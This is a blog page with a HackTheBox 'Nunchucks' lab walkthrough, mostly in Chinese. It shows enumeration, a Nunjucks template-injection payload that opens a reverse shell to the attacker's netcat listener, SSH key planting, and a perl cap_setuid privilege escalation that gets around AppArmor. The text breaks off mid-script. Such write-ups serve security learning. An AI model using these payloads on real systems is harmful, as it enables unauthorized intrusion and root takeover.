<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>HackTheBox Nunchucks Walkthrough | Kur0&#39;s Blog</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="HackTheBox Nunchucks Walkthrough">
    <meta name="generator" content="Hugo 0.144.2">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >




    

    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/hackthebox-nunchucks-walkthrough/">
    

    <meta property="og:url" content="http://localhost:1313/posts/hackthebox-nunchucks-walkthrough/">
  <meta property="og:site_name" content="Kur0&#39;s Blog">
  <meta property="og:title" content="HackTheBox Nunchucks Walkthrough">
  <meta property="og:description" content="HackTheBox Nunchucks Walkthrough">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-02-11T09:47:03+00:00">
    <meta property="article:modified_time" content="2022-02-11T09:47:03+00:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Hackthebox">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="NodeJS">
    <meta property="article:tag" content="SSTI">
    <meta property="article:tag" content="SUID">
    <meta property="og:image" content="http://localhost:1313/posts/hackthebox-nunchucks-walkthrough/cover.png">

  <meta itemprop="name" content="HackTheBox Nunchucks Walkthrough">
  <meta itemprop="description" content="HackTheBox Nunchucks Walkthrough">
  <meta itemprop="datePublished" content="2022-02-11T09:47:03+00:00">
  <meta itemprop="dateModified" content="2022-02-11T09:47:03+00:00">
  <meta itemprop="wordCount" content="1002">
  <meta itemprop="image" content="http://localhost:1313/posts/hackthebox-nunchucks-walkthrough/cover.png">
  <meta itemprop="keywords" content="Writeup,Hackthebox,Linux,NodeJS,SSTI,SUID">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/hackthebox-nunchucks-walkthrough/cover.png">
  <meta name="twitter:title" content="HackTheBox Nunchucks Walkthrough">
  <meta name="twitter:description" content="HackTheBox Nunchucks Walkthrough">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  
  
  
  <header class="cover bg-center" style="background-image: url('/posts/hackthebox-nunchucks-walkthrough/cover.png');">
    <div class="bg-black-60">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        Kur0&#39;s Blog
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

      <div class="tc-l pv6 ph3 ph4-ns">
        
          <div class="f2 f1-l fw2 white-90 mb0 lh-title">HackTheBox Nunchucks Walkthrough</div>
          
            <div class="fw1 f5 f3-l white-80 measure-wide-l center lh-copy mt3 mb4">
              HackTheBox Nunchucks Walkthrough
            </div>
          
        
      </div>
    </div>
  </header>



    <main class="pb7" role="main">
      
  
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">HackTheBox Nunchucks Walkthrough</h1>
      
      
      
      <time class="f6 mv4 dib tracked" datetime="2022-02-11T09:47:03Z">February 11, 2022</time>
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h1 id="enumeration">Enumeration</h1>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.11.222 | grep ^<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ports=22,80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nmap -sC -sV -p$ports 10.10.11.122
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.92 scan initiated Wed Feb  9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.122
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.32s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://nunchucks.htb/
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-title: Nunchucks - Landing Page
</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>nunchucks.htb/organizationName<span style="color:#f92672">=</span>Nunchucks-Certificates/stateOrProvinceName<span style="color:#f92672">=</span>Dorset/countryName<span style="color:#f92672">=</span>UK
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>Nunchucks-CA/countryName<span style="color:#f92672">=</span>US
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2021-08-30T15:42:24
</span></span><span style="display:flex;"><span>| Not valid after:  2031-08-28T15:42:24
</span></span><span style="display:flex;"><span>| MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4
</span></span><span style="display:flex;"><span>|_SHA-1: 518c 0fd1 <span style="color:#ae81ff">6903</span> 75c0 f26b a6cb e37d 53b8 a3ff 858b
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done 1 IP address (1 host up) scanned in 34.33 seconds</span>
</span></span></code></pre></div><h2 id="web-application">Web Application</h2>
<p>修改hosts文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;10.10.11.122  nunchucks.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>访问网站，自动转为https协议，扫描目录</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u <span style="color:#e6db74">&#39;https://nunchucks.htb&#39;</span>   
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:09:36<span style="color:#f92672">]</span> Starting:                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:09:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  166B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:10:37<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  179B  - /assets  -&gt;  /assets/                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:10:44<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  166B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd    
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:11:16<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    9KB - /login           
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:11:17<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    9KB - /login/          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:11:37<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   19KB - /privacy         
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:11:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -    1KB - /servlet/%C0%AE%C0%AE%C0%AF                      
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:11:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    9KB - /signup          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:11:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   17KB - /terms           
</span></span><span style="display:flex;"><span>Task Completed
</span></span></code></pre></div><p>发现注册和登录页面，访问注册页面进行注册</p>
<p><img src="signup.png" alt="signup"></p>
<p><img src="login.png" alt="login"></p>
<p>注册、登录均关闭，继续爆破子域名</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw <span style="color:#ae81ff">2271</span> -H <span style="color:#e6db74">&#34;Host: FUZZ.nunchucks.htb&#34;</span>  -u <span style="color:#e6db74">&#34;https://nunchucks.htb&#34;</span>            
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: https://nunchucks.htb/
</span></span><span style="display:flex;"><span>Total requests: 4997
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload      
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000000081:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">101</span> L    <span style="color:#ae81ff">259</span> W      <span style="color:#ae81ff">4028</span> Ch     <span style="color:#e6db74">&#34;store&#34;</span> 
</span></span></code></pre></div><p>hosts文件加入store.nunchucks.htb后访问页面</p>
<p><img src="store.png" alt="store"></p>
<hr>
<h1 id="vuln">Vuln</h1>
<h2 id="ssti">SSTI</h2>
<p>输入邮箱地址，通过burp抓包修改参数可以发现SSTI漏洞</p>
<p><img src="burp.png" alt="burp"></p>
<blockquote>
<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks">NUNJUCKS(NodeJS) SSTI vulnerability</a></p></blockquote>
<p>模板注入反弹shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># payload:{{range.constructor(\&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.4 4444 &gt;/tmp/f&#39;)\&#34;)()}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.4<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.122<span style="color:#f92672">]</span> <span style="color:#ae81ff">49368</span>
</span></span><span style="display:flex;"><span>sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span>$ pwd
</span></span><span style="display:flex;"><span>/var/www/store.nunchucks
</span></span><span style="display:flex;"><span>$ cd ~
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>user.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取sshshell</span>
</span></span><span style="display:flex;"><span>$ mkdir .ssh
</span></span><span style="display:flex;"><span>$ cd .ssh
</span></span><span style="display:flex;"><span>$ echo id_rsa.pub &gt; authorized_keys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ssh david@10.10.11.122                                                                          
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-86-generic x86_64<span style="color:#f92672">)</span>                                   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com                                                          
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com                                                  
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage                                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Fri <span style="color:#ae81ff">11</span> Feb 01:11:31 UTC <span style="color:#ae81ff">2022</span>                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:             0.55                                                                     
</span></span><span style="display:flex;"><span>  Usage of /:              48.8% of 6.82GB                                                          
</span></span><span style="display:flex;"><span>  Memory usage:            45%                                                                      
</span></span><span style="display:flex;"><span>  Swap usage:              0%                                                                       
</span></span><span style="display:flex;"><span>  Processes:               <span style="color:#ae81ff">270</span>                                                                      
</span></span><span style="display:flex;"><span>  Users logged in:         <span style="color:#ae81ff">0</span>                                                                        
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.11.122                                                             
</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:19d7                                            
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span> updates can be applied immediately.                                                              
</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.                                              
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>david@nunchucks:/tmp$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span>
</span></span></code></pre></div><hr>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>查看可执行文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/tmp$ find / -type f -perm -u<span style="color:#f92672">=</span>s 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/fusermount
</span></span><span style="display:flex;"><span>/usr/bin/umount
</span></span><span style="display:flex;"><span>/usr/bin/chsh
</span></span><span style="display:flex;"><span>/usr/bin/chfn
</span></span><span style="display:flex;"><span>/usr/bin/at
</span></span><span style="display:flex;"><span>/usr/bin/mount
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
</span></span><span style="display:flex;"><span>/usr/bin/newgrp
</span></span><span style="display:flex;"><span>/usr/bin/passwd
</span></span><span style="display:flex;"><span>/usr/bin/pkexec
</span></span><span style="display:flex;"><span>/usr/bin/su
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex;"><span>/usr/sbin/pppd
</span></span></code></pre></div><p>同时查看网站配置文件发现mysql用户名密码，经测试均无法提权</p>
<p>最后经网上搜索发现通过getcap查看文件capabilities</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/tmp$ getcap -r / 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/perl <span style="color:#f92672">=</span> cap_setuid+ep
</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#f92672">=</span> cap_net_raw+ep
</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#f92672">=</span> cap_net_raw+ep
</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#f92672">=</span> cap_net_bind_service,cap_net_admin+ep
</span></span></code></pre></div><p>发现perl有cap_setuid+ep属性，可以通过perl提权
参考<a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">https://gtfobins.github.io/gtfobins/perl/#capabilities</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 尝试提权</span>
</span></span><span style="display:flex;"><span>david@nunchucks:/tmp$ perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span> 
</span></span><span style="display:flex;"><span>david@nunchucks:/tmp$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 未成功 - -</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 使用其他命令</span>
</span></span><span style="display:flex;"><span>david@nunchucks:/tmp$ perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;id&#34;;&#39;</span> 
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>david@nunchucks:/tmp$ perl -e <span style="color:#e6db74">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;cat /root/root.txt&#34;;&#39;</span> 
</span></span><span style="display:flex;"><span>cat: /root/root.txt: Permission denied <span style="color:#75715e"># 无权限，什么鬼？</span>
</span></span></code></pre></div><p>继续搜索&hellip;发现使用了AppArmor技术</p>
<blockquote>
<p><strong>AppArmor</strong>
Introduction
AppArmor is a Mandatory Access Control (MAC) system which is a kernel (LSM) enhancement to confine programs to a limited set of resources. AppArmor&rsquo;s security model is to bind access control attributes to programs rather than to users. AppArmor confinement is provided via profiles loaded into the kernel, typically on boot. AppArmor profiles can be in one of two modes: enforcement and complain. Profiles loaded in enforcement mode will result in enforcement of the policy defined in the profile as well as reporting policy violation attempts (either via syslog or auditd). Profiles in complain mode will not enforce policy but instead report policy violation attempts.
AppArmor differs from some other MAC systems on Linux: it is path-based, it allows mixing of enforcement and complain mode profiles, it uses include files to ease development, and it has a far lower barrier to entry than other popular MAC systems.
AppArmor is an established technology first seen in Immunix and later integrated into Ubuntu, Novell/SUSE, and Mandriva. Core AppArmor functionality is in the mainline Linux kernel from 2.6.36 onwards; work is ongoing by AppArmor, Ubuntu and other developers to merge additional AppArmor functionality into the mainline kernel.</p></blockquote>
<p>查看/etc/apparmor.d/usr.bin.perl</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Last Modified: Tue Aug 31 18:25:30 2021</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;tunables/global&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/perl <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#include &lt;abstractions/base&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#include &lt;abstractions/nameservice&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#include &lt;abstractions/perl&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  capability setuid,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  deny owner /etc/nsswitch.conf r,
</span></span><span style="display:flex;"><span>  deny /root/* rwx,
</span></span><span style="display:flex;"><span>  deny /etc/shadow rwx,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  /usr/bin/id mrix,
</span></span><span style="display:flex;"><span>  /usr/bin/ls mrix,
</span></span><span style="display:flex;"><span>  /usr/bin/cat mrix,
</span></span><span style="display:flex;"><span>  /usr/bin/whoami mrix,
</span></span><span style="display:flex;"><span>  /opt/backup.pl mrix,
</span></span><span style="display:flex;"><span>  owner /home/ r,
</span></span><span style="display:flex;"><span>  owner /home/david/ r,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>无/root的rwx权限，但是有个/opt/backup.pl脚本，查看脚本内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/perl                                                                                     </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> strict;                                                                                         
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> POSIX <span style="color:#e6db74">qw(strftime)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> DBI;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> POSIX <span style="color:#e6db74">qw(setuid)</span>; 
</span></span><span style="display:flex;"><span>POSIX::setuid(<span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $tmpdir        <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $backup_main <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $now <span style="color:#f92672">=</span> strftime(<span style="color:#e6db74">&#34;%Y-%m-%d-%s&#34;</span>, localtime);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $tmpbdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;$tmpdir/backup_$now&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">printlog</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[&#34;</span>, strftime(<span style="color:#e6db74">&#34;%D %T&#34;</span>, localtime), <span style="color:#e6db74">&#34;] $_[0]\n&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">archive</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    printlog <span style="color:#e6db74">&#34;Archiving...&#34;</span>;
</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span>);
</span></span><span style="display:flex;"><span>    printlog <span style="color:#e6db74">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($&gt; <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    die <span style="color:#e6db74">&#34;You must run this script as root.\n&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printlog <span style="color:#e6db74">&#34;Backup starts.&#34;</span>;
</span></span><span style="display:flex;"><span>mkdir($tmpbdir);
</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>archive;
</span></span><span style="display:flex;"><span>printlog <span style="color:#e6db74">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span>;
</span></span><span style="display:flex;"><span>system(<span style="color:#e6db74">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span>);
</span></span><span style="display:flex;"><span>printlog <span style="color:#e6db74">&#34;Removing temporary directory&#34;</span>;
</span></span><span style="display:flex;"><span>rmdir($tmpbdir);
</span></span><span style="display:flex;"><span>printlog <span style="color:#e6db74">&#34;Completed&#34;</span>;
</span></span></code></pre></div><p>脚本通过设置setuid以root用户运行，这样可以按照同样方法写提权脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#75715e">#/tmp/exp.pl</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/perl                                                                                     </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> strict;                                                                                         
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> POSIX <span style="color:#e6db74">qw(strftime)</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> DBI;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> POSIX <span style="color:#e6db74">qw(setuid)</span>; 
